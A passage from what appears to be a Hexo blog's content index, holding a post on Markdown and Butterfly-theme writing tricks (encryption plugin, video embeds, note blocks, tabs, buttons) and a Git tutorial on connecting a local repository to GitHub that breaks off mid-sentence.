      
      <categories>
          
          <category> C/C++ Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog Writing Tricks</title>
      <link href="/2022/07/20/Blog/Blog%20Writing%20Tricks/"/>
      <url>/2022/07/20/Blog/Blog%20Writing%20Tricks/</url>
      
        <content type="html"><![CDATA[<h2 id="bold-and-italic">Bold and Italic</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**Hello,World!**</span></span><br><span class="line"><span class="emphasis">*Hello,world!*</span></span><br></pre></td></tr></table></figure><p><strong>Hello,World!</strong> <em>Hello,world!</em></p><hr /><h2 id="inline-html">Inline HTML</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span>To reboot your computer, press <span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>ctrl<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>alt<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="language-xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>del<span class="language-xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>.<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>To reboot your computer, press<kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>del</kbd>.</p><hr /><h2 id="blog-encryption">Blog Encryption</h2><h3 id="install-hexo-blog-encrypt-plugin">Install hexo-blog-encryptPlugin</h3><ul><li>Run <code>npm install hexo-blog-encrypt</code> in the hexodirectory</li><li>Add the following content to the <code>/Hexo/_config.yml</code>file:</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">encrypt</span>:</span><br><span class="line"><span class="attr">enable</span>:<span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="using-the-plugin">Using the Plugin</h3><ul><li>Add the corresponding text to the header of the blog post where youwant to use encryption:</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="attr">title</span>: <span class="title class_">Hexo</span>加密功能</span><br><span class="line"><span class="attr">date</span>: <span class="number">2019</span>-<span class="number">09</span>-<span class="number">04</span> <span class="number">23</span>:<span class="number">20</span>:<span class="number">00</span>   </span><br><span class="line"><span class="attr">tags</span>: [学习笔记,<span class="title class_">Hexo</span>]</span><br><span class="line"><span class="attr">categories</span>: <span class="title class_">Blog</span> <span class="title class_">Setup</span></span><br><span class="line"><span class="attr">password</span>: smile   </span><br><span class="line"><span class="attr">abstract</span>: <span class="title class_">Welcome</span> to my blog, enter password to read. </span><br><span class="line"><span class="attr">message</span>: 密码输入框上描述性内容</span><br><span class="line">---</span><br></pre></td></tr></table></figure><ul><li>Where:<ul><li>password: The password used for this blog post</li><li>abstract: Blog summary text (brief)</li><li>message: Descriptive text above the password input box</li></ul></li></ul><p><ahref="https://cloud.tencent.com/developer/article/1917942">OriginalLink</a></p><hr /><h2 id="insert-youtube-videos">Insert YouTube Videos</h2><h3 id="static-image-link">Static Image Link</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Html version:</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://youtu.be/BSlMAJ7SkMA</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">alt</span>=<span class="string">&quot;IMAGE ALT TEXT HERE&quot;</span> <span class="attr">width</span>=<span class="string">&quot;240&quot;</span> <span class="attr">height</span>=<span class="string">&quot;180&quot;</span> <span class="attr">border</span>=<span class="string">&quot;10&quot;</span> /&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">Pure markdown version:</span><br><span class="line"></span><br><span class="line">[<span class="string">![IMAGE ALT TEXT HERE</span>](<span class="link">https://img.youtube.com/vi/ARted4RniaU/0.jpg</span>)](<span class="link">https://www.youtube.com/watch?v=ARted4RniaU</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://youtu.be/BSlMAJ7SkMA" target="_blank"><img src="https://img.youtube.com/vi/ARted4RniaU/0.jpg"alt="IMAGE ALT TEXT HERE" width="700" height="500" border="20" /></a></p><p>Pure markdown version:</p><p><a href="https://www.youtube.com/watch?v=ARted4RniaU"><imgsrc="https://img.youtube.com/vi/ARted4RniaU/0.jpg"alt="IMAGE ALT TEXT HERE" /></a></p><hr /><h3 id="embedded-video">Embedded Video</h3><h4 id="method-1">Method 1:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure><div class="video-container"><iframe src="https://www.youtube.com/embed/BSlMAJ7SkMA" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p>How to find the video ID:</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-20%2015.05.24.png" /></p><p>The <strong>string</strong> of letters and numbers after the addressin the image, such as: BSlMAJ7SkMA</p><hr /><h4 id="method-2">Method 2:</h4><p>Click the embed option in the image above, which provides HTML code(HTML and markdown have some compatibility), and directly copy it to themd file.</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-20%2015.05.39.png" /></p><div class="note info flat"><p>You can modify some HTML attributes like width and height. Especiallywidth=100% will make it stretch to full width.</p></div><iframe width="100%" height="400" src="https://www.youtube.com/embed/BSlMAJ7SkMA" title="YouTube video player" frameborder="10" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><hr /><h2 id="block-quote">Block Quote</h2><p>Add quotes to your blog…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [author,source] [link] [source_link_title] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Thank you for watching!</p><footer><strong>lixiang, daily</strong><cite><a href="https://hustlixiang21.github.io">Li Xiang's Blog</a></cite></footer></blockquote>---Can be nested!<blockquote><p>感谢观看！</p><blockquote><p>Thank you for watching!</p><footer><strong>lixiang,daily</strong><cite><a href="https://hustlixiang21.github.io">Li Xiang’sBlog</a></cite></footer></blockquote><footer><strong>lixiang, daily</strong><cite><a href="https://hustlixiang21.github.io">李翔的博客</a></cite></footer></blockquote><hr /><h2 id="note-bootstrap-callout">Note (Bootstrap Callout)</h2><p>Each method is divided into simple, modern, and flat themes, whichare the so-called styles.</p><p>Here I only show the flat style</p><h3 id="method-1-1">Method 1:</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;</span><br><span class="line">Default note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;</span><br><span class="line">default note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;</span><br><span class="line">primary note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;</span><br><span class="line">success note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;</span><br><span class="line">info note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;</span><br><span class="line">warning note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;</span><br><span class="line">danger note block tag</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="note flat"><p>Default note block tag</p></div><div class="note default flat"><p>default note block tag</p></div><div class="note primary flat"><p>primary note block tag</p></div><div class="note success flat"><p>success note block tag</p></div><div class="note info flat"><p>info note block tag</p></div><div class="note warning flat"><p>warning note block tag</p></div><div class="note danger flat"><p>danger note block tag</p></div><hr /><h3 id="method-2-1">Method 2:</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;</span><br><span class="line">Are you using Visa or UnionPay</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;</span><br><span class="line">2021 is coming soon....</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;</span><br><span class="line">Drive carefully, safety first</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;</span><br><span class="line">Is this three blades or four?</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;</span><br><span class="line">Are you using Visa or UnionPay</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;</span><br><span class="line">Rock Paper Scissors</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;</span><br><span class="line">The browser that frontend developers hate the most</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>Are you using Visa or UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021 is coming soon….</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>Drive carefully, safety first</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>Is this three blades or four?</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>Are you using Visa or UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>Rock Paper Scissors</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>The browser that frontend developers hate the most</p></div><hr /><h2 id="tabs">Tabs</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">test1 1</button><button type="button" class="tab">test1 2</button><button type="button" class="tab">test1 3</button></div><div class="tab-contents"><div class="tab-item-content active"><p><strong>This is Tab 1.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 2.</strong></p></div><div class="tab-item-content"><p><strong>This is Tab 3.</strong></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><hr /><h2 id="button">Button</h2><h3 id="inline">Inline</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is my website, click the button &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly %&#125;</span><br><span class="line">This is my website, click the button &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,,outline%&#125;</span><br></pre></td></tr></table></figure><p>This is my website, click the button <a class="btn-beautify " href="https://butterfly.js.org" title="Butterfly"><span>Butterfly</span></a> This is mywebsite, click the button <a class="btn-beautify outline" href="https://butterfly.js.org" title="Butterfly"><span>Butterfly</span></a></p><hr /><h3 id="block">Block</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This is my website, click the button  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block larger %&#125;</span><br><span class="line">This is my website, click the button  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block center larger %&#125;</span><br><span class="line">This is my website, click the button  &#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,block right blue larger %&#125;</span><br></pre></td></tr></table></figure><p>This is my website, click the button <a class="btn-beautify block larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a> This is mywebsite, click the button <a class="btn-beautify block center larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a> This is my website, click thebutton <a class="btn-beautify block right blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></p><hr /><h3 id="options">Options</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-center&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,blue larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,pink larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,red larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,purple larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,orange larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,green larger %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><div class="btn-center"><a class="btn-beautify larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify pink larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify red larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify purple larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify orange larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify green larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></div><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn-center&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline blue larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline pink larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline red larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline purple larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline orange larger %&#125;</span><br><span class="line">&#123;% btn &#x27;https://butterfly.js.org&#x27;,Butterfly,far fa-hand-point-right,outline green larger %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><div class="btn-center"><a class="btn-beautify outline larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline blue larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline pink larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline red larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline purple larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline orange larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a><a class="btn-beautify outline green larger" href="https://butterfly.js.org" title="Butterfly"><i class="far fa-hand-point-right"></i><span>Butterfly</span></a></div>]]></content>
      
      
      <categories>
          
          <category> Blog Setup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog Writing Tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Remote Connection</title>
      <link href="/2022/07/17/Tools/Git%20Remote%20Connection/"/>
      <url>/2022/07/17/Tools/Git%20Remote%20Connection/</url>
      
        <content type="html"><![CDATA[<p>This is written following the previous article on Git Introduction,mainly because I encountered quite a few problems when trying to uploadsome resource files to GitHub.</p><p>I think there should be <strong>two</strong> ways to establishconnections that I can currently implement.</p><p>Before describing the implementation methods, I think we shouldunderstand the <strong>remote operation commands</strong>.</p><h2 id="common-git-commands">Common Git Commands</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">git init                    //Initialize local repository, generate a .git folder, which is the core of git</span><br><span class="line"></span><br><span class="line">git add [target]            //Add target files to staging area</span><br><span class="line"></span><br><span class="line">git rm -f &lt;filename&gt;        //This command deletes the file from both staging area and working directory</span><br><span class="line"></span><br><span class="line">git rm --cached &lt;filename&gt;  //When you add files you don&#x27;t want, this command can delete files from staging area but keep them in working directory</span><br><span class="line"></span><br><span class="line">git commit                  //Commit files in staging area, use -m [message] to add necessary information (can also auto-popup if not added)</span><br><span class="line"></span><br><span class="line">git status                  //View git status</span><br><span class="line"></span><br><span class="line">git clone [url or ssh]      </span><br><span class="line">//Very important point is to clone the remote repository directly, it will automatically connect to the cloned remote repository by default, named origin</span><br><span class="line"></span><br><span class="line">git pull origin master      </span><br><span class="line">//Pull the corresponding branch from remote repository &quot;origin&quot; to master in local repository, often need to pull the latest repository before push</span><br><span class="line"></span><br><span class="line">git pull origin master --allow-unrelated-histories </span><br><span class="line">//If local and remote are two independent repositories, need to specify &quot;allow unrelated histories merge&quot; when pulling, otherwise it will fail</span><br><span class="line"></span><br><span class="line">git push origin master </span><br><span class="line">//Submit content from local repository to remote repository (origin is the remote branch name, master is the current branch name. Note that this command is not completely complete. In actual use, if it&#x27;s the first time submitting to remote, should use [git push -u origin master], if not the first time, just use git push directly)</span><br><span class="line"></span><br><span class="line">git remote add origin [url or ssh]</span><br><span class="line">//Add a remote repository connection and name it &quot;origin&quot;, of course can also customize other names, but generally named origin</span><br><span class="line"></span><br><span class="line">git remote rm origin        //Delete a remote repository connection named &quot;origin&quot;</span><br><span class="line"></span><br><span class="line">git remote set-url origin [url or ssh]</span><br><span class="line">//Modify the url of &quot;origin&quot; (combined with the above command, there are two ways to modify remote repository connection: one is delete then add, the other is direct modification)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>Both URL and SSH can be viewed and copied from the code button in therepository interface, SSH is more secure.</p></blockquote><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/20200213161009663.png"alt="Principle" /><figcaption aria-hidden="true">Principle</figcaption></figure><h3 id="difference-between-git-add-.-and-git-add">Difference between gitadd . and git add *</h3><p>git add . adds all files, folders and subfolders, including.gitignore and any other content starting with a dot;</p><p>git add * will add any files, folders and subfolders except thosestarting with a dot.</p><p>git add . also respects .gitignore, while git add * will throw anerror when any non-dot file is gitignored. <u>Using git add . is muchbetter than git add *</u>.</p><p>* is not part of git, it’s a wildcard interpreted by the shell. *expands to all files in the current directory, then passes to git, gitadds all files. . is the current directory itself, git add will add itand all files under it.</p><p>add * means add all files in the current directory except files whosenames start with a dot. This is a shell feature, Git only receives thefile list.</p><p>add . has no special meaning in the shell, so git recursively addsthe entire directory, almost the same, but includes files whose namesstart with a dot.</p><h3 id="methods-to-delete-remote-repository-files">Methods to DeleteRemote Repository Files</h3><p>One very important point to note when deleting is that files in thestaging area <u>will not be cleared after commit</u>. Similarly, thefiles you deleted are still in the staging area, and you need to<u>remove the deleted files from the staging area</u> before you cancommit.</p><h4id="delete-files-or-directories-from-both-current-working-directory-and-staging-area.">Deletefiles or directories from both current working directory and stagingarea.</h4><p><code>git rm &lt;file&gt;</code><code>git rm -r &lt;path&gt;</code></p><h4 id="only-delete-files-or-directories-from-staging-area.">Only deletefiles or directories from staging area.</h4><p><code>git rm --cache &lt;file&gt;</code><code>git rm -r --cache &lt;path&gt;</code></p><h4 id="direct-deletion-method">Direct Deletion Method</h4><p>Directly delete specified files or directories. Suitable for caseswhere the number of files to be deleted is relatively small.</p><p><code>git rm -r --cached demo</code><code>git commit -m 'Delete demo folder'</code><code>git push -u origin master</code></p><h4 id="filter-deletion-method">Filter Deletion Method</h4><p>Add a .gitignore file in the project root directory to filter outunwanted files, then execute commands. The principle of this operationis to delete all files in the staging area, then add files filtered bythe .gitignore file to the staging area through the git add . command.This method is suitable for bulk deletion of files.</p><p><code>git rm -r --cached .</code> <code>git add .</code><code>git commit</code> <code>git push  -u origin master</code></p><p>Whether direct deletion or filter deletion, the purpose is to deletethe records of already deleted files in the staging area.</p><p>PS: Pay attention to various information in your command lineprompts</p><h2 id="first-implementation-method-git-clone">First ImplementationMethod (git clone)</h2><h3 id="step1-create-a-repository-named-git_test-on-github">Step1:Create a repository named git_test on GitHub</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2017.12.03.png" /></p><h3 id="step2-enter-a-folder-and-use-git-clone">Step2: Enter a folderand use git clone <repository URL or SSH></h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.28.52.png" /></p><p>At this point, git clone completely clones the entire repository tolocal. It will generate a folder with the same name as the repository.Enter the folder and you can directly see the .git file.</p><h3id="step3-no-need-for-remote-connection-automatically-established-connection-default-origin">Step3:No need for remote connection, automatically established connection(default origin)</h3><p>Use git remote -v to view remote connection information</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.35.28.png" /></p><h3 id="step4-create-test-files-and-commit-to-remote-repository">Step4:Create test files and commit to remote repository</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.39.24.png" /></p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.42.25.png" /></p><p>Testing complete!</p><h2id="second-implementation-method-initialize-local-repository-manually-add-connection">SecondImplementation Method (Initialize Local Repository + Manually AddConnection)</h2><h3id="step1-create-a-new-repository-on-github-while-initializing-a-local-repository">Step1:Create a new repository on GitHub while initializing a localrepository</h3><p>Create new repository:</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.52.37.png" /></p><p>Enter folder ~/Desktop/git_freely and use git init to initializelocal repository</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.54.27.png" /></p><p>It can also be seen that the local repository has not established aremote connection.</p><h3 id="step2-establish-remote-connection">Step2: Establish remoteconnection</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2019.56.10.png" /></p><p>It can be seen that a remote connection has been established at thistime, and the name given to the remote repository can actually bearbitrary (usually origin), I named it lixiang.</p><h3id="ask-a-question-can-we-directly-create-test-files-according-to-the-first-implementation-method-at-this-time-then-git-add-commit-push"><u>Aska question: Can we directly create test files according to the firstimplementation method at this time, then git add, commit, push?</u></h3><p>Since I asked, it’s definitely not possible😄, let’s try it if youdon’t believe me.</p><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2022-07-17%2020.02.15.png" /></p><p>Why?</p><p>This may require understanding some basic principles of git. Ibelieve everyone has heard it called distributed version control. Let’sjust focus on the four words “version control”. Does your localrepository have any version of the remote repository? You need to knowthat when you create a new repository on GitHub, it has a first versioncalled <u>initial commit</u> (it might not be called this), but inshort, I want to say that creation is accompanied by the firstinitialization commit, but the local doesn’t have it. You might ask, whynot, how do you know? Let’s check with git 